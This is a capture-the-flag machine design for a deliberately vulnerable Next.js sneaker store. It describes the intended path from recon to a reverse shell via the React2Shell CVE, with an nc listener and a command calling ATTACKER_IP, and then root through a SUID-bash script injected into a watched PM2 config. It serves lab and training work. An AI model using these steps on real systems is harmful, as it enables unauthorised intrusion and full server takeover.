# CTF Machine: KickStore

## Overview

**Name:** KickStore
**Difficulty:** Easy
**OS:** Ubuntu 25.04
**Domain:** `kickstore.ms`
**Theme:** Solo-developer sneaker e-commerce store, deployed carelessly with PM2

**Story:** A solo developer built a sneaker e-commerce store using Next.js 15 with React Server Components and MongoDB. He deployed it on his Ubuntu server under his own user account, manages it with PM2, and ran `sudo pm2 startup` to survive reboots. He never updated Next.js after the initial launch. The store has 50+ products, customer accounts, orders, and reviews — a live business running on a neglected stack.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | Nginx (HTTPS 443) → Next.js 15 (port 3000) |
| Database | MongoDB (localhost, no auth) |
| Process Manager | PM2 (root daemon via `sudo pm2 startup`) |
| Open Ports | 22 (SSH), 443 (HTTPS) |
| App runs as | `dev` user directly |

---

## Attack Chain

### 1 → Enumeration & Fingerprinting — Anonymous → Tech Stack Identified

The solver scans the target and fingerprints the framework through standard recon techniques — no browser extensions needed:

- `nmap -sV` reveals port 22 (SSH) and 443 (HTTPS)
- `curl -kI` returns `X-Powered-By: Next.js` header
- Page source contains `/_next/static/chunks/...` asset paths and `<div id="__next">`
- Burp Suite intercept shows `RSC: 1` and `Next-Action` headers in requests, confirming React Server Components are active

The solver researches Next.js 15 + React Server Components vulnerabilities and finds CVE-2025-55182 (React2Shell) — a CVSS 10.0 unauthenticated RCE via unsafe deserialization in the RSC Flight protocol. They verify with the PoC's check mode:

```bash
python3 react2shell-poc.py -t https://kickstore.ms --check
```

### 2 → CVE-2025-55182 (React2Shell) — Anonymous → Shell as dev

The solver exploits the confirmed vulnerability using the public PoC:

```bash
# Terminal 1
nc -lvnp 9001

# Terminal 2
python3 react2shell.py -u https://kickstore.ms -l ATTACKER_IP -p 9001
```

The reverse shell connects as `dev` — the user who runs the Next.js app directly via PM2. No `www-data`, no container — just a developer who started his app under his own account and called it production.

**Why it works:** The developer installed Next.js 15.0.x at launch and never updated. CVE-2025-55182 affects all Next.js 15 versions with React Server Components enabled before the patch. The app uses RSC by default (Next.js 15 App Router), making it vulnerable.

### 3 → PM2 Root Daemon Misconfiguration — dev → root

The solver enumerates the system and discovers two PM2 daemons running — one owned by `dev`, one by **root**. The root daemon exists because the developer ran `sudo pm2 startup`, which created a root-level systemd service with `--watch` enabled on the app directory. The ecosystem config at `/opt/kickstore/ecosystem.config.js` is writable by `dev` since he owns the entire app directory.

The solver creates a malicious shell script and injects a new app entry into `ecosystem.config.js`. The root PM2 daemon detects the file change via `--watch`, auto-reloads the config, and executes the injected app as root — creating a SUID bash at `/tmp/rootbash`.

```bash
# Check running PM2 processes
ps aux | grep pm2

# Verify ecosystem config is writable
ls -la /opt/kickstore/ecosystem.config.js

# Create malicious script
echo '#!/bin/bash' > /opt/kickstore/pwn.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/kickstore/pwn.sh
chmod +x /opt/kickstore/pwn.sh

# Inject into ecosystem config
# (add a new app entry pointing to pwn.sh)

# Wait for PM2 watch to trigger, then:
/tmp/rootbash -p
```

**Why it works:** `sudo pm2 startup` is the standard way developers make PM2 survive reboots. It creates a root systemd service by design. Combined with `--watch` on a user-owned directory, any file change triggers a root-level reload. This is not a contrived vulnerability — it's a documented PM2 behavior that the developer never secured.

---

## Rabbit Holes

*None for this Easy machine.*

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | /home/dev/ | dev |
| root.txt | /root/ | root |

---

## Full Chain Diagram

```
Anonymous
    │  nmap → curl → view source → Burp
    │  Next.js 15 + RSC confirmed
    │  CVE-2025-55182 → react2shell.py → reverse shell
    ▼
dev  →  user.txt
    │  ps aux → root PM2 daemon
    │  ecosystem.config.js writable + watch enabled
    │  Inject malicious app → root PM2 executes it
    ▼
root  →  root.txt
```

---

## Implementation Notes

### Packages to Install
- nginx, nodejs (v20 LTS), npm, mongodb-org, pm2 (global)

### Configuration Changes
- Nginx reverse proxy from 443 → localhost:3000 with self-signed SSL
- MongoDB bound to localhost, no authentication
- PM2 ecosystem with `--watch` enabled
- `sudo pm2 startup` executed to create root systemd service

### Files to Create
- Next.js 15 e-commerce application at `/opt/kickstore/`
- `ecosystem.config.js` with watch configuration
- 50+ product entries in MongoDB
- Sample customer accounts and orders

### Services to Enable
- nginx, mongod, pm2-root (systemd)

### User Accounts
| Username | Password | Shell | Groups | Purpose |
|----------|----------|-------|--------|---------|
| dev | [random] | /bin/bash | dev | App developer, runs the Next.js store |

### Verification Checklist
- [ ] `nmap -sV` shows only ports 22 and 443
- [ ] `curl -kI https://kickstore.ms` returns `X-Powered-By: Next.js`
- [ ] react2shell PoC achieves shell as `dev`
- [ ] `ps aux` shows root-owned PM2 daemon
- [ ] `ecosystem.config.js` is writable by `dev`
- [ ] Injecting an app entry triggers root execution via watch
- [ ] user.txt readable by `dev`, root.txt readable by root only
- [ ] No unintended privesc paths (test with linpeas)
